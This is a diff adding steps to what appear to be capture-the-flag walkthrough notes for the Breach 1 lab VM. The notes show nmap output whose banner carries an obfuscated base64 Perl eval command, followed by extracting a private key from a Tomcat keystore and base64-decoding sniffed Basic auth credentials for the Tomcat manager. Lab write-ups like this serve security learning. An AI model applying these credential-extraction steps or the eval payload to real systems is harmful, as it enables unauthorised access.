@@ -96,7 +96,7 @@ Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-14 15:30 +07
   ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ----------
 #
 
-root@Blue3:~# nmap -sC -sV -A -oA NmapFull -p22,80,443,614,8080,17235 breach1.ctf
+root@Blue3:~# nmap -sC -sV -A -oA NmapFull -p22,80,443,614,8080,8443,17235 breach1.ctf
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-14 15:34 +07
 Nmap scan report for breach1.ctf (192.168.110.140)
 Host is up (0.00061s latency).
@@ -115,6 +115,8 @@ PORT      STATE SERVICE       VERSION
 | fingerprint-strings:
 |   NULL:
 |_    /bin/bash -c {perl,-e,$0,useSPACEMIME::Base64,cHJpbnQgIlBXTkVEXG4iIHggNSA7ICRfPWBwd2RgOyBwcmludCAiXG51cGxvYWRpbmcgeW91ciBob21lIGRpcmVjdG9yeTogIiwkXywiLi4uIFxuXG4iOw==} $_=$ARGV[0];~s/SPACE/ /ig;eval;$_=$ARGV[1];eval(decode_base64($_));
+8443/tcp open  ssl/https-alt?
+|_ssl-date: 2020-09-15T14:31:35+00:00; +6h59m59s from scanner time.
 17235/tcp open  ssl/ssh-mgmt?
 2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
 ==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
@@ -137,6 +139,9 @@ Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
 TRACEROUTE
 HOP RTT     ADDRESS
 1   0.62 ms breach1.ctf (192.168.110.140)
+
+Host script results:
+|_clock-skew: 6h59m58s
 
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 185.20 seconds
@@ -239,6 +244,40 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
   ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ----------
 #
 
+Download the suspected image: bill.png (Hint: "Look at the source code")
+
+root@Blue3:.../Breach1# exiftool bill.png
+ExifTool Version Number         : 12.06
+File Name                       : bill.png
+Directory                       : .
+File Size                       : 315 kB
+File Modification Date/Time     : 2020:09:15 16:01:36+07:00
+File Access Date/Time           : 2020:09:15 16:01:36+07:00
+File Inode Change Date/Time     : 2020:09:15 16:01:36+07:00
+File Permissions                : rw-r--r--
+File Type                       : PNG
+File Type Extension             : png
+MIME Type                       : image/png
+Image Width                     : 610
+Image Height                    : 327
+Bit Depth                       : 8
+Color Type                      : RGB with Alpha
+Compression                     : Deflate/Inflate
+Filter                          : Adaptive
+Interlace                       : Noninterlaced
+Warning                         : [minor] Text chunk(s) found after PNG IDAT (may be ignored by some readers)
+Comment                         : coffeestains
+Image Size                      : 610x327
+Megapixels                      : 0.199
+
+=> coffeestains ?
+
+#
+  ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ----------
+  ---------- ---------- ---------- ----------         NEXT          ---------- ---------- ---------- ----------
+  ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ----------
+#
+
 view-source:http://breach1.ctf/index.html:
 ...
 <!------Y0dkcFltSnZibk02WkdGdGJtbDBabVZsYkNSbmIyOWtkRzlpWldGbllXNW5KSFJo ----->
@@ -283,3 +322,75 @@ They told me the alias, storepassword and keypassword are all set to 'tomcat'.
 Is that useful?? Does anyone know what this is?
 I guess we are securely encrypted now? -Peter
 p.s. I'm going fishing for the next 2 days and will not have access to email or phone.
+
+#
+  ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ----------
+  ---------- ---------- ---------- ----------         NEXT          ---------- ---------- ---------- ----------
+  ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ----------
+#
+
+root@Blue3:.../Breach1# keytool -importkeystore -srckeystore keystore -srcstorepass tomcat -srckeypass tomcat -srcalias tomcat -destalias tomcat -destkeystore keystore.p12 -deststoretype PKCS12
+Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
+Importing keystore keystore to keystore.p12...
+Enter destination keystore password: tomcat
+Re-enter new password: tomcat
+root@Blue3:.../Breach1# dlist
+total 72
+drwxr-xr-x 21 root root  4096 Sep 14 16:08 ..
+-rw-r--r--  1 root root  2245 Sep 14 17:51 keystore
+-rw-r--r--  1 root root 41412 Sep 14 17:59 _SSL_test_phase1.pcap
+-rw-r--r--  1 root root 12233 Sep 15 14:34 reconemu.txt
+-rw-r--r--  1 root root  2583 Sep 15 14:37 keystore.p12
+drwxr-xr-x  2 root root  4096 Sep 15 14:37 .
+
+root@Blue3:.../Breach1# openssl pkcs12 -in keystore.p12 -nodes -nocerts -out private_key.pem
+Enter Import Password: tomcat
+
+#
+  ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ----------
+  ---------- ---------- ---------- ----------         NEXT          ---------- ---------- ---------- ----------
+  ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ----------
+#
+
+root@Blue3:.../Breach1# keytool -export -alias tomcat -keystore keystore -rfc -file keystore.crt
+Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
+Enter keystore password: tomcat
+Certificate stored in file <keystore.crt>
+
+Warning:
+The JKS keystore uses a proprietary format. It is recommended to migrate to PKCS12 which is an industry standard format using "keytool -importkeystore -srckeystore keystore -destkeystore keystore -deststoretype pkcs12".
+
+#
+  ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ----------
+  ---------- ---------- ---------- ----------         NEXT          ---------- ---------- ---------- ----------
+  ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ----------
+#
+
+On pcap-stream.txt:
+...
+GET /_M@nag3Me/html HTTP/1.1
+Host: 192.168.110.140:8443
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:31.0) Gecko/20100101 Firefox/31.0 Iceweasel/31.8.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Cookie: /impresscms/modules/profile/admin/category.php_mod_profile_Category_sortsel=cat_weight; /impresscms/modules/profile/admin/category.php_mod_profile_Category_ordersel=ASC; /impresscms/modules/profile/admin/category.php_limitsel=15; /impresscms/modules/profile/admin/category.php_mod_profile_Category_filtersel=default; /impresscms/modules/profile/admin/field.php_mod_profile_Field_sortsel=field_name; /impresscms/modules/profile/admin/field.php_mod_profile_Field_ordersel=ASC; /impresscms/modules/profile/admin/field.php_limitsel=15; /impresscms/modules/profile/admin/field.php_mod_profile_Field_filtersel=default; /impresscms/modules/profile/admin/regstep.php_mod_profile_Regstep_sortsel=step_name; /impresscms/modules/profile/admin/regstep.php_mod_profile_Regstep_ordersel=ASC; /impresscms/modules/profile/admin/regstep.php_limitsel=15; /impresscms/modules/profile/admin/regstep.php_mod_profile_Regstep_filtersel=default
+Connection: keep-alive
+Authorization: Basic dG9tY2F0OlR0XDVEOEYoIyEqdT1HKTRtN3pC
+
+HTTP/1.1 200 OK
+Server: Apache-Coyote/1.1
+Pragma: No-cache
+Cache-Control: no-cache
+Expires: Wed, 31 Dec 1969 19:00:00 EST
+Set-Cookie: JSESSIONID=D7A894398479A598FA50BCCEA3AFCFAD; Path=/_M%40nag3Me; Secure
+Content-Type: text/html;charset=utf-8
+Transfer-Encoding: chunked
+Date: Sat, 04 Jun 2016 16:56:51 GMT
+...
+
+=> Authorization: Basic dG9tY2F0OlR0XDVEOEYoIyEqdT1HKTRtN3pC
+root@Blue3:~# echo "dG9tY2F0OlR0XDVEOEYoIyEqdT1HKTRtN3pC" | base64 -d
+tomcat:Tt\5D8F(#!*u=G)4m7zB
+=> So we have the login for Tomcat Dashboard https://breach1.ctf:8443/_M@nag3Me/html, but we need the Certificate for going in.
+=> Logged in with Burp Suite help.
